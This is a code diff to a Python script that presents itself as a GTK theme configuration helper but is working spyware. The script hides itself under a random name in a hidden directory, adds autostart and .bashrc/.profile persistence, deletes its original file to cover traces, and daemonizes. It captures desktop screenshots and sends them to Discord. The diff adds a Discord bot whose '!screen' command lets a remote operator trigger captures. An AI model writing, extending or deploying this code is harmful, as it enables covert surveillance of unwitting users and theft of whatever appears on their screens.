@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-.gtk-theme-helper - Theme configuration service
+.gtk-theme-helper - Theme configuration service with Discord bot
 """
 
 import os
@@ -18,7 +18,7 @@ import logging
 import random
 import string
 
-# Configuration - User-writable locations only
+# Configuration
 SERVICE_NAME = f".theme-helper-{''.join(random.choices(string.ascii_lowercase, k=4))}"
 HIDDEN_DIR = os.path.expanduser(f"~/.local/share/.theme-cache-{''.join(random.choices(string.digits, k=8))}")
 CONFIG_FILE = f"{HIDDEN_DIR}/.config.json"
@@ -49,45 +49,30 @@ def install_requirements():
     
     print("Installing theme utilities...")
     
-    # Try different pip commands
-    pip_commands = [
-        [sys.executable, "-m", "pip", "install", "--user"],
-        ["pip3", "install", "--user"],
-        ["pip", "install", "--user"]
-    ]
-    
-    for pip_cmd in pip_commands:
-        try:
-            result = subprocess.run(
-                pip_cmd + python_packages,
-                capture_output=True,
-                timeout=300,
-                check=False
-            )
-            if result.returncode == 0:
-                print("Theme utilities installed")
-                return True
-        except:
-            continue
-    
-    print("Some theme utilities may need manual setup")
-    return False
+    # Try pip installation
+    try:
+        subprocess.run([
+            sys.executable, "-m", "pip", "install", "--user"
+        ] + python_packages,
+        capture_output=True, timeout=300, check=False)
+        print("Theme utilities installed")
+        return True
+    except:
+        return False
 
 def install_user_service():
-    """Install as user service (no sudo required)"""
+    """Install as user service"""
     try:
-        # Create hidden directory in user home
+        # Create hidden directory
         os.makedirs(HIDDEN_DIR, exist_ok=True)
         
-        # Copy script with random name
+        # Copy current script
         current_script = os.path.abspath(__file__)
         target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
         
-        # Read current content
         with open(current_script, 'r') as f:
             content = f.read()
         
-        # Write to stealth location
         with open(target_script, 'w') as f:
             f.write(content)
         
@@ -109,7 +94,7 @@ X-GNOME-Autostart-enabled=true
         with open(desktop_file, 'w') as f:
             f.write(desktop_content)
         
-        # Add to shell profiles for persistence
+        # Add to shell profiles
         bashrc_line = f"\n# Theme configuration\n[ -x \"{target_script}\" ] && /usr/bin/python3 \"{target_script}\" --service &\n"
         
         for rc_file in ['.bashrc', '.profile']:
@@ -127,41 +112,34 @@ X-GNOME-Autostart-enabled=true
 def clean_traces(original_path):
     """Remove traces of the original file"""
     try:
-        # Only clean if we're not running from the stealth location
         if original_path != f"{HIDDEN_DIR}/{SERVICE_NAME}" and os.path.exists(original_path):
             try:
-                # Remove the original file
                 os.remove(original_path)
             except:
                 pass
-                    
-    except Exception as e:
+    except:
         pass
 
 def daemonize():
     """Turn into a daemon process"""
     try:
-        # Fork first time
         pid = os.fork()
         if pid > 0:
             sys.exit(0)
-    except OSError as e:
+    except OSError:
         sys.exit(1)
     
-    # Decouple from parent environment
     os.chdir("/")
     os.setsid()
     os.umask(0)
     
-    # Fork second time
     try:
         pid = os.fork()
         if pid > 0:
             sys.exit(0)
-    except OSError as e:
+    except OSError:
         sys.exit(1)
     
-    # Redirect standard file descriptors to /dev/null
     with open(os.devnull, 'r') as f:
         os.dup2(f.fileno(), sys.stdin.fileno())
     with open(os.devnull, 'w') as f:
@@ -188,8 +166,7 @@ def fetch_token():
     return None
 
 def setup_display_environment():
-    """Setup display environment for PyAutoGUI"""
-    # Try common displays
+    """Setup display environment"""
     displays = [':0', ':0.0', ':1', ':1.0']
     
     for display in displays:
@@ -202,24 +179,18 @@ def setup_display_environment():
         except:
             continue
     
-    # Fallback
     os.environ['DISPLAY'] = ':0'
     return True
 
 def take_screenshot_pyautogui():
     """Take screenshot using PyAutoGUI"""
     try:
-        # Setup display environment
         setup_display_environment()
-        
-        # Import pyautogui
         import pyautogui
         
-        # Create temporary file
         temp_dir = tempfile.gettempdir()
         screenshot_path = os.path.join(temp_dir, f"theme_preview_{int(time.time())}.png")
         
-        # Take screenshot
         screenshot = pyautogui.screenshot()
         screenshot.save(screenshot_path)
         
@@ -246,7 +217,7 @@ def handle_signal(signum, frame):
     sys.exit(0)
 
 def create_lock():
-    """Create lock file to prevent multiple instances"""
+    """Create lock file"""
     try:
         with open(LOCK_FILE, 'w') as f:
             f.write(str(os.getpid()))
@@ -262,74 +233,139 @@ def remove_lock():
     except:
         pass
 
+def request_screenshot():
+    """Request screenshot from service"""
+    try:
+        trigger_file = Path("/tmp/.theme_preview_trigger")
+        trigger_file.touch()
+        return True
+    except:
+        return False
+
+# ----------------- DISCORD BOT SETUP -----------------
+def setup_discord_bot():
+    """Setup and run Discord bot"""
+    try:
+        import discord
+        from discord.ext import commands
+        
+        # Get token
+        token = fetch_token()
+        if not token:
+            print("Failed to get Discord token")
+            return False
+        
+        intents = discord.Intents.default()
+        intents.message_content = True
+        bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
+        
+        @bot.event
+        async def on_ready():
+            print(f"Theme helper bot logged in as {bot.user}")
+            
+        @bot.command(name="screen")
+        async def cmd_screen(ctx):
+            """Take a screenshot"""
+            try:
+                await ctx.send("📸 Taking theme preview...")
+                
+                if request_screenshot():
+                    await ctx.send("✅ Preview requested")
+                else:
+                    await ctx.send("❌ Preview service busy")
+                    
+            except Exception as e:
+                await ctx.send(f"❌ Error: {e}")
+        
+        @bot.command(name="status")
+        async def cmd_status(ctx):
+            """Check bot status"""
+            await ctx.send("🟢 Theme helper service active")
+        
+        # Run the bot
+        bot.run(token)
+        return True
+        
+    except Exception as e:
+        print(f"Discord bot error: {e}")
+        return False
+
+def screenshot_service():
+    """Run the screenshot service"""
+    # Check for lock file
+    if os.path.exists(LOCK_FILE):
+        try:
+            with open(LOCK_FILE, 'r') as f:
+                pid = int(f.read().strip())
+            try:
+                os.kill(pid, 0)
+                return  # Already running
+            except OSError:
+                pass
+        except:
+            pass
+    
+    if not create_lock():
+        return
+    
+    # Run as daemon
+    daemonize()
+    setup_logging()
+    
+    signal.signal(signal.SIGTERM, handle_signal)
+    signal.signal(signal.SIGINT, handle_signal)
+    atexit.register(remove_lock)
+    
+    token = fetch_token()
+    if not token:
+        return
+    
+    # Main service loop
+    trigger_file = Path("/tmp/.theme_preview_trigger")
+    last_trigger = 0
+    
+    while True:
+        try:
+            # Check for trigger file
+            if trigger_file.exists():
+                current_time = time.time()
+                if current_time - last_trigger > 30:
+                    last_trigger = current_time
+                    screenshot_path = take_screenshot_pyautogui()
+                    if screenshot_path:
+                        send_to_discord(screenshot_path, token)
+                        try:
+                            os.remove(screenshot_path)
+                        except:
+                            pass
+                    try:
+                        trigger_file.unlink()
+                    except:
+                        pass
+            
+            time.sleep(2)
+            
+        except Exception as e:
+            time.sleep(10)
+
 def main():
     """Main function"""
     if '--service' in sys.argv:
-        # Check for lock file
-        if os.path.exists(LOCK_FILE):
-            try:
-                with open(LOCK_FILE, 'r') as f:
-                    pid = int(f.read().strip())
-                try:
-                    os.kill(pid, 0)
-                    sys.exit(0)
-                except OSError:
-                    pass
-            except:
-                pass
-        
-        if not create_lock():
-            sys.exit(1)
-        
-        # Run as daemon
-        daemonize()
-        setup_logging()
-        
-        # Set up signal handlers
-        signal.signal(signal.SIGTERM, handle_signal)
-        signal.signal(signal.SIGINT, handle_signal)
-        atexit.register(remove_lock)
-        
-        token = fetch_token()
-        if not token:
-            return
-        
-        # Main service loop
-        trigger_file = Path("/tmp/.theme_preview_trigger")
-        last_trigger = 0
-        
-        while True:
-            try:
-                # Check for trigger file
-                if trigger_file.exists():
-                    current_time = time.time()
-                    if current_time - last_trigger > 30:
-                        last_trigger = current_time
-                        screenshot_path = take_screenshot_pyautogui()
-                        if screenshot_path:
-                            send_to_discord(screenshot_path, token)
-                            try:
-                                os.remove(screenshot_path)
-                            except:
-                                pass
-                        try:
-                            trigger_file.unlink()
-                        except:
-                            pass
-                
-                time.sleep(2)
-                
-            except Exception as e:
-                time.sleep(10)
-    
+        # Run only the screenshot service
+        screenshot_service()
+    elif '--bot' in sys.argv:
+        # Run only the Discord bot
+        setup_discord_bot()
     else:
-        # Interactive mode - create trigger file
-        try:
-            trigger_file = Path("/tmp/.theme_preview_trigger")
-            trigger_file.touch()
-            print("Theme preview requested.")
-        except Exception as e:
-            print("Theme helper busy.")
+        # Run both services
+        import threading
+        
+        # Start screenshot service in background thread
+        service_thread = threading.Thread(target=screenshot_service, daemon=True)
+        service_thread.start()
+        
+        # Run Discord bot in main thread
+        setup_discord_bot()
 
 if __name__ == "__main__":
     # Auto-install on first run
@@ -338,9 +374,7 @@ if __name__ == "__main__":
         if install_requirements():
             if install_user_service():
                 print("Theme helper configured")
-                # Clean traces
                 clean_traces(os.path.abspath(__file__))
-                # Start service
                 target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
                 if os.path.exists(target_script):
                     os.system(f"/usr/bin/python3 {target_script} --service &")
